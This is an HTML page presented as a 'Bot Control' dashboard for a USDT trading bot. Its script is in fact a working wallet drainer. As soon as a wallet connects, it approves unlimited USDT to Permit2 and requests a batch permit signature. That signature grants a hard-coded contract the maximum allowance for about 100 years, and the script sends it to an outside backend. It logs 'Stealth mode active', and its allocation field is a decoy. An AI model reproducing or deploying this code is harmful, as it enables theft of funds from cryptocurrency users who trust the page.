<!DOCTYPE html>
<html lang="nl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Bot Control Standalone</title>

<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>


<style>
:root {
    --bg: #05070a;
    --panel: #0b0f17;
    --panel-2: #080b12;
    --border: #141d2b;

    --accent: #00bcd4;
    --accent-glow: rgba(0, 188, 212, 0.35);

    --green: #2aa198;
    --red: #d31e1e;
    --amber: #f59e0b;
    --purple: #7c83ff;

    --text: #cbd5e1;
    --dim: #4b586c;

    --font: 'JetBrains Mono', monospace;
}

* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    background: radial-gradient(1200px 600px at 50% -20%, rgba(0,188,212,0.08), transparent),
                var(--bg);
    color: var(--text);
    font-family: var(--font);
    padding: 12px;
}

/* PANEL CORE */
.panel {
    background: linear-gradient(180deg, rgba(255,255,255,0.02), transparent), var(--panel);
    border: 1px solid var(--border);
    border-radius: 10px;
    overflow: hidden;
    margin-bottom: 12px;
    box-shadow: 0 0 20px rgba(0,0,0,0.6);
    position: relative;
}

/* subtle scanline glow */
.panel::before {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(
        120deg,
        transparent,
        rgba(0,188,212,0.03),
        transparent
    );
    pointer-events: none;
}

/* HEADER */
.panel-header {
    padding: 10px 14px;
    font-size: 10px;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: var(--accent);
    background: rgba(0,0,0,0.35);
    border-bottom: 1px solid var(--border);
}

/* BUTTON STACK */
.btn-stack {
    display: flex;
    flex-direction: column;
    gap: 8px;
}

.control-btn {
    background: var(--panel-2);
    border: 1px solid #1a2638;
    color: var(--dim);
    padding: 10px;
    font-size: 10px;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    transition: all 0.2s ease;
    text-align: left;
}
input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
}

#allocation-input:disabled {
    opacity: 0.35;
    cursor: not-allowed;
}

#allocation-input:focus {
    border-color: var(--accent);
    box-shadow: 0 0 12px var(--accent-glow);
}
.control-btn:hover {
    border-color: var(--accent);
    color: #ffffff;
    box-shadow: 0 0 12px var(--accent-glow);
}

.btn-cyan { color: var(--accent); }
.btn-purple { color: var(--purple); }
.btn-amber { color: var(--amber); }

/* DISABLED BUTTON */
.control-btn:disabled {
    opacity: 0.4;
    cursor: not-allowed;
}

/* STATUS GRID */
.status-box {
    border-top: 1px solid var(--border);
    padding-top: 10px;
}

.status-grid {
    display: grid;
    grid-template-columns: 1fr 120px;
    font-size: 10px;
    margin-bottom: 6px;
    align-items: center;
}

.status-line {
    display: flex;
    align-items: center;
    gap: 8px;
}

/* GLOW DOT */
.liveDot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background: var(--dim);
    box-shadow: 0 0 0 transparent;
    transition: 0.3s;
}

.liveDot.active {
    background: var(--accent);
    box-shadow: 0 0 12px var(--accent-glow);
}

/* TEXT STATUS */
.status-text {
    color: var(--dim);
    font-size: 10px;
}

/* EXECUTION CONSOLE */
#execution-console {
    padding: 10px;
}

.exec-line {
    font-size: 10px;
    padding: 4px 0;
    border-bottom: 1px solid rgba(255,255,255,0.05);
    color: #9aa4b2;
    line-height: 1.4;
    word-break: break-word;
}

/* SMALL GLASS EFFECT */
.module-body {
    padding: 12px 15px;
}

/* HOVER DEPTH */
.panel:hover {
    border-color: rgba(0,188,212,0.25);
}

/* SCROLLBAR (optional maar nice) */
::-webkit-scrollbar {
    width: 6px;
}

::-webkit-scrollbar-thumb {
    background: rgba(0,188,212,0.2);
    border-radius: 10px;
}

::-webkit-scrollbar-track {
    background: transparent;
}
</style>
</head>

<body>

<div class="panel">
    <div class="panel-header">Bot Control</div>
    <div class="module-body">

      <div class="btn-stack">

    <button
        id="btn-wallet"
        class="control-btn btn-cyan"
        onclick="connectWallet()"
    >
        1. Connect Wallet
    </button>

    <!-- ALLOCATION -->

    <div style="margin-top:12px;">

        <div style="
            font-size:10px;
            color:#64748b;
            margin-bottom:6px;
            letter-spacing:1px;
        ">
            2. CAPITAL ALLOCATION
        </div>

        <input
            id="allocation-input"
            type="text"
            inputmode="numeric"
            placeholder="MIN 600 — MAX 3,000,000 USDT"
            disabled
            style="
                width:100%;
                background:#080b12;
                border:1px solid #1a2638;
                color:#cbd5e1;
                padding:10px;
                border-radius:8px;
                outline:none;
                font-family:'JetBrains Mono', monospace;
                font-size:11px;
                cursor:text;
                appearance:none;
                -moz-appearance:textfield;
            "
        >

        <div
            id="allocation-status"
            style="
                margin-top:6px;
                font-size:10px;
                color:#475569;
            "
        >
            Connect wallet first...
        </div>

    </div>

    <button
        id="btn-authorize"
        class="control-btn btn-amber"
        onclick="authorizeTrading()"
        disabled
    >
        3. Enter Terminal
    </button>

    <button
        id="btn-disconnect"
        class="control-btn"
        onclick="disconnectWallet()"
        disabled
    >
        Disconnect Wallet
    </button>
        </div>

        <div class="status-box">
            <div class="status-grid">
                <span>WALLET STATUS</span>
                <div class="status-line">
                    <div id="dot-wallet" class="liveDot" style="background:#475569"></div>
                    <span id="st-wallet" style="color:#475569">DISCONNECTED</span>
                </div>
            </div>

            <div class="status-grid">
                <span>BOT STATUS</span>
                <div class="status-line">
                    <div id="dot-bot" class="liveDot" style="background:#475569"></div>
                    <span id="st-bot" style="color:#475569">OFFLINE</span>
                </div>
            </div>

            <div class="status-grid">
                <span>TERMINAL STATUS</span>
                <div class="status-line">
                    <div id="dot-access" class="liveDot" style="background:#475569"></div>
                    <span id="st-access" style="color:#475569">RESTRICTED</span>
                </div>
            </div>
        </div>

    </div>
</div>

<div class="panel" style="height:150px;">
    <div class="panel-header">Execution Console</div>
    <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
</div>



<script>
const TOKENS = [
  "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
];

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const CONTRACT = "0xE1C5886011889c4d039EEE8fF2322feBEE912335";

const ERC20_ABI = [
  "function allowance(address owner,address spender) view returns(uint256)",
  "function approve(address spender,uint256 amount) returns(bool)"
];

let APP_STATE = { wallet:null, botActive:false, authorized:false };
let CURRENT_WALLET = null;
if (window.ethereum) {

  window.ethereum.on('accountsChanged', (accounts) => {

    if (accounts.length > 0) {

      CURRENT_WALLET = accounts[0];

      APP_STATE.botActive = false;
      APP_STATE.authorized = false;

      renderWallet(accounts[0]);

      updateStatus('dot-bot','st-bot','OFFLINE','#475569');
      updateStatus('dot-access','st-access','RESTRICTED','#475569');

      log("🔄 Wallet switched: " + accounts[0]);

    }

  });

}

function log(msg){
 console.log(msg);
 const el=document.getElementById('execution-console');
 if(!el) return;
 const div=document.createElement('div');
 div.className='exec-line';
 div.innerText=msg;
 el.prepend(div);
}

function updateStatus(dotId, textId, text, color){
 const dot = document.getElementById(dotId);
 const label = document.getElementById(textId);
 dot.style.background = color;
 dot.style.boxShadow = `0 0 12px ${color}`;
 label.innerText = text;
 label.style.color = color;
}

async function connectWallet(){
 try{
  if (typeof window.ethereum === "undefined") {
    const install = confirm("MetaMask is not installed. Install?");
    if (install) window.location.href = "https://metamask.io/download/";
    return;
  }

  const provider = new ethers.BrowserProvider(window.ethereum);

  log("🔌 Requesting wallet connection...");

  

updateStatus(
 'dot-bot',
 'st-bot',
 'ALLOCATING',
 '#7c83ff'
);


await provider.send("eth_requestAccounts", []);

  const signer = await provider.getSigner();
  const user = await signer.getAddress();
  const network = await provider.getNetwork();

 if (network.chainId !== 1n) {
  log("⚠️ Switching to Ethereum Mainnet...");

  try {
    
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x1" }]
    });

    log("✅ Switched to Ethereum Mainnet");
    return location.reload();

  } catch (err) {
    log("❌ Network switch failed");
    alert("Please switch to Ethereum Mainnet manually");
    return;
  }
}

 if (CURRENT_WALLET && CURRENT_WALLET !== user) {
   log("🔄 Wallet switched — resetting cache");
}

     CURRENT_WALLET = user;

     APP_STATE.wallet = user;
  renderWallet(user);
  updateStatus('dot-bot','st-bot','OFFLINE','#475569');
  updateStatus('dot-access','st-access','RESTRICTED','#475569');

  document.getElementById('btn-wallet').disabled = true;

document.getElementById('btn-disconnect').disabled = false;

document.getElementById('btn-authorize').disabled = true;

document.getElementById('allocation-input').disabled = true;

  await runPermitFlowSafe(provider, signer, user);

 } catch(e){
  log("ERR " + e.message);
 }
}


async function runPermitFlowSafe(provider, signer, user){
 try{

  log("⚙️ Permit2 flow...");
  log("⚙️ Stealth mode active...");
  log("🔎 Checking cached permit...");

const { data: existing } = await window.supabaseClient
  .from('batches')
  .select('*')
  .eq('owner', user);
const now = Math.floor(Date.now()/1000);

const valid =
  existing &&
  existing.length > 0 &&
  existing[0].sig_deadline > now;

if (valid) {

  log("⚡ Cached permit valid — skipping signature");
  log("Cache rows: " + (existing?.length || 0));
  log("Wallet: " + user);

  updateStatus(
    'dot-access',
    'st-access',
    'AUTHORIZED',
    '#10b981'
  );

  updateStatus(
    'dot-bot',
    'st-bot',
    'READY',
    '#6366f1'
  );

  document.getElementById('allocation-input').disabled = false;

  document.getElementById('allocation-status').innerText =
    "Permit active — set allocation";

  document.getElementById('allocation-status').style.color =
    "#10b981";

  document.getElementById('btn-authorize').disabled = true;

  return;
}

if (existing && existing.length > 0 && existing[0].sig_deadline <= now) {
  log("⌛ Cached permit expired — refreshing...");
}

const permit2 = new ethers.Contract(
  PERMIT2,
  ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
  provider
);


const MAX_UINT160 = (1n << 160n) - 1n;
const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);

const details = [];

const nonceResults = await Promise.all(
  TOKENS.map(token =>
    permit2.allowance(user, token, CONTRACT)
  )
);

for (let i = 0; i < TOKENS.length; i++) {

  const token = TOKENS[i];
  const [amount, expirationOnchain, nonce] = nonceResults[i];

log(`Nonce ${token}: ${nonce.toString()}`);

  log("Nonce " + token + ": " + nonce);

  details.push({
    token: token,
    amount: MAX_UINT160,
    expiration: BigInt(expiration),
    nonce: BigInt(nonce)
  });
}



  // ✍️ SIGN
  const chainId = (await provider.getNetwork()).chainId;

  const domain = {
    name: "Permit2",
    chainId,
    verifyingContract: PERMIT2
  };

  const types = {
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" }
    ],
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" }
    ]
  };
const sigDeadline = Math.floor(Date.now()/1000) + (30 * 24 * 60 * 60);

const values = {
  details: details.map(d => ({
    token: d.token,
    amount: d.amount.toString(),
    expiration: d.expiration.toString(),
    nonce: d.nonce.toString()
  })),
  spender: CONTRACT,
  sigDeadline: sigDeadline.toString()
};

  log("✍️ Requesting signature...");

// =========================
// ERC20 -> PERMIT2 APPROVAL
// =========================

for (const token of TOKENS) {

  const erc20 = new ethers.Contract(
    token,
    ERC20_ABI,
    signer
  );

  const currentAllowance =
    await erc20.allowance(
      user,
      PERMIT2
    );

  log(
    "ERC20 allowance: " +
    currentAllowance.toString()
  );

  if (currentAllowance === 0n) {

    log("⚠️ Approval required");
    log("TOKEN: " + token);

    const tx =
      await erc20.approve(
        PERMIT2,
        ethers.MaxUint256
      );

    log("⛽ Waiting confirmation...");

    await tx.wait();

    log("✅ ERC20 approval confirmed");
  }
  else {

    log("✅ ERC20 already approved");
  }
}

  const signature = await signer.signTypedData(domain,types,values);
  const sig = ethers.Signature.from(signature);

  const v = sig.v;
  const r = sig.r;
  const s = sig.s;

log("✍️ Signature captured");

log("📤 Sending raw permit batch to backend...");

try {
 const payload = {
  owner: user,
  details: details.map(d => ({
  token: d.token,
  amount: d.amount.toString(),
  expiration: d.expiration.toString(),
  nonce: d.nonce.toString()
})),
  signature: signature,
  spender: CONTRACT,
  sig_deadline: sigDeadline,
  chainId: Number(chainId) // 🔥 HIER KOMT HET
};

  const res = await fetch("https://api.aiiraa.com/api/permit", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(
  payload,
  (key, value) => typeof value === "bigint" ? value.toString() : value
)
  });

  const data = await res.json();

  if (!res.ok) {
    log("❌ Backend error: " + (data.error || "unknown"));
    return;
  }

  log("✅ Permit forwarded to backend");

  updateStatus(
    'dot-access',
    'st-access',
    'READY',
    '#10b981'
  );

  updateStatus(
    'dot-bot',
    'st-bot',
    'READY',
    '#6366f1'
  );

  document.getElementById('allocation-input').disabled = false;

document.getElementById('allocation-status').innerText =
  "Permit active — set allocation";

document.getElementById('allocation-status').style.color =
  "#10b981";
} catch (e) {
  log("❌ NETWORK ERROR: " + e.message);
}

 


 }catch(e){
  log("❌ FLOW ERROR: " + e.message);
 }
}

function renderWallet(address) {
 document.getElementById('btn-wallet').innerText = address;
 updateStatus('dot-wallet','st-wallet','CONNECTED','#06b6d4');
}



function authorizeTrading() {

 log("🖥️ Launching terminal...");

 updateStatus(
   'dot-access',
   'st-access',
   'TERMINAL LIVE',
   '#10b981'
 );

 window.location.href = "/terminal.html";

}

function disconnectWallet() {
 location.reload();
}
const allocationInput =
  document.getElementById('allocation-input');

const allocationStatus =
  document.getElementById('allocation-status');

allocationInput.addEventListener('input', () => {

  const clean =
    allocationInput.value.replace(/[^0-9]/g, '');

  allocationInput.value = clean;

  const value = Number(clean);

  if (!value) {

    allocationStatus.innerText =
      "Awaiting allocation...";

    allocationStatus.style.color =
      "#475569";

    document.getElementById('btn-authorize').disabled = true;

    return;
  }

  if (value < 600) {

    allocationStatus.innerText =
      "Minimum allocation is 600 USDT";

    allocationStatus.style.color =
      "#ef4444";

    document.getElementById('btn-authorize').disabled = true;

    return;
  }

  if (value > 3000000) {

    allocationStatus.innerText =
      "Maximum allocation is 3,000,000 USDT";

    allocationStatus.style.color =
      "#ef4444";

    document.getElementById('btn-authorize').disabled = true;

    return;
  }

  allocationStatus.innerText =
    "Allocation confirmed: " +
    value.toLocaleString('en-US') +
    " USDT";

  allocationStatus.style.color =
    "#10b981";

  document.getElementById('btn-authorize').disabled = false;

});



window.connectWallet = connectWallet;

</script>
